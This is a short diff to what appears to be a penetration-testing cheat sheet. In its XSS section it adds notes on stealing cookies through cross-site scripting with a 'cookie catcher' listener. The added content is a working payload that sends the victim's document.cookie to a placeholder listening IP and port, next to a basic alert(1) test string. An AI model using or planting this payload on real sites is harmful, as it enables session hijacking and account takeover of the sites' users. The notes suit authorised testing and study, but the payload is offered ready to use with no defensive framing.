@@ -58,3 +58,7 @@ protocol - telnet, ftp, smb, etc
 
 --# XSS #--
 Test<script>alert(1);</script>
+
+#using XSS to steal cookie#
+#using tool such as cookie catcher, set up listening PHP system
+<script>document.location='http://<listeningip>:<listeningporr>/' + document.cookie</script>
